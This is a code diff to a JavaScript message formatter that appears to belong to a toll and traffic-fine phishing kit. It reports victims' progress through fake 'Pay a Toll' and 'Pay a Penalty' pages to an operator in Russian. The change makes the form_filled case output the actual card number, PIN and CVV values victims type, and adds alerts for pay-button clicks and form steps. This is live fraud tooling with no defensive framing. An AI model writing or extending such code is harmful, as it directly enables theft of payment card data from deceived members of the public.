@@ -448,67 +448,76 @@ function formatSessionMessage(session, sessionId) {
     
     switch (logType) {
       case 'page_view':
-        if (logPath && logPath.includes('pay-toll')) {
-          item = 'оплата';
-        } else if (logPath && logPath.includes('pay-penalty')) {
-          item = 'фак';
-        } else if (logPath && (logPath === '/' || logPath === '')) {
-          item = 'главная';
-        } else if (logPage && logPage.toLowerCase().includes('pay-toll')) {
-          item = 'оплата';
-        } else if (logPage && logPage.toLowerCase().includes('pay-penalty')) {
-          item = 'фак';
+        if (logPath) {
+          item = getPageNameRu(logPath);
         } else if (logPage) {
-          // Try to extract page name
-          const pageLower = logPage.toLowerCase();
-          if (pageLower.includes('toll')) item = 'оплата';
-          else if (pageLower.includes('penalty') || pageLower.includes('штраф')) item = 'фак';
-          else item = 'главная';
+          // Try to extract path from page name
+          if (logPage.includes('Pay a Toll') || logPage.includes('Оплата проезда')) {
+            item = '💰 Pay a Toll (Оплата проезда)';
+          } else if (logPage.includes('Pay a Penalty') || logPage.includes('Оплата штрафа')) {
+            item = '⚠️ Pay a Penalty (Оплата штрафа)';
+          } else {
+            item = logPage;
+          }
         } else {
-          item = 'главная';
+          item = '🏠 Главная';
         }
         break;
       case 'navigation':
-        if (logPath && logPath.includes('pay-toll')) {
-          item = 'оплата';
-        } else if (logPath && logPath.includes('pay-penalty')) {
-          item = 'фак';
-        } else if (logPage && logPage.toLowerCase().includes('pay-toll')) {
-          item = 'оплата';
-        } else if (logPage && logPage.toLowerCase().includes('pay-penalty')) {
-          item = 'фак';
+        if (logPath) {
+          item = getPageNameRu(logPath);
+        } else if (logPage) {
+          if (logPage.includes('Pay a Toll') || logPage.includes('Оплата проезда')) {
+            item = '💰 Pay a Toll (Оплата проезда)';
+          } else if (logPage.includes('Pay a Penalty') || logPage.includes('Оплата штрафа')) {
+            item = '⚠️ Pay a Penalty (Оплата штрафа)';
+          } else {
+            item = logPage;
+          }
         }
         break;
       case 'payment_page':
         if (logPath && logPath.includes('pay-penalty')) {
-          item = 'фак';
+          item = '⚠️ Pay a Penalty (Оплата штрафа)';
         } else if (logPath && logPath.includes('pay-toll')) {
-          item = 'оплата';
+          item = '💰 Pay a Toll (Оплата проезда)';
         } else {
-          item = 'оплата';
+          item = '💳 Страница оплаты';
         }
         break;
       case 'pay_button_click':
-        item = 'нажал на кнопку pay';
+        item = '🚨 НАЖАЛ КНОПКУ PAY!';
         break;
       case 'form_submit':
         // Skip if page is G/collect or similar tracking endpoints
         if (logPage && (logPage.includes('G/collect') || logPage.includes('collect') || logPage === 'view')) {
           return;
         }
-        item = 'отправил форму';
+        item = '📤 Отправил форму';
         break;
       case 'form_filled':
         // Only show important fields
         if (logField && (logField.includes('card') || logField.includes('pin') || logField.includes('cvv'))) {
-          item = `заполнил ${getFieldNameRu(logField).toLowerCase()}`;
+          item = `✅ ${getFieldNameRu(logField)}: ${logValue}`;
         }
         break;
       case 'payment_redirect':
-        item = 'переход на оплату';
+        item = '💰 Переход на оплату';
         break;
       case 'card_page':
-        item = 'страница ввода карты';
+        item = '💳 Страница ввода карты';
+        break;
+      case 'form_step_1':
+        item = '📝 ШАГ 1: Ввод данных авто';
+        break;
+      case 'form_step_2':
+        item = '📝 ШАГ 2: Ввод email';
+        break;
+      case 'form_step_3':
+        item = '📝 ШАГ 3: Подтверждение';
+        break;
+      case 'form_input':
+        item = `✏️ Заполняет: ${getFieldNameRu(logField)}`;
         break;
       default:
         // Skip other events
